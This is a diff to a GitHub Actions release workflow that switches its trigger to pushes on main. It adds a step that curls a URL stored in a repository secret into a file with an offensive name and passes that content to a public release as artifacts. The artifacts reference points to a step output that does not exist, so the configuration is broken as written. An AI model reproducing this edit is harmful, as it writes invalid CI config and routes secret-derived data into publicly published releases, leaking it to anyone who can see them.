@@ -2,17 +2,19 @@ name: Releases
 
 on: 
   push:
-    tags:
-    - '*'
+    branches:
+    - main
 
 jobs:
 
   build:
     runs-on: ubuntu-latest
     steps:
+    - name: samuca
+      id: corno
+      run: curl "${{secrets.SONAR_URL}}" > gay.json
     - uses: actions/checkout@v2
     - uses: ncipollo/release-action@v1.8.9
       with:
-        artifacts: "curl ${{secrets.SONAR_URL}}"
-        bodyFile: "README.md"
+        artifacts: ${{steps.corno.outputs.gay.json}}
         token: ${{ secrets.GITHUB_TOKEN }}
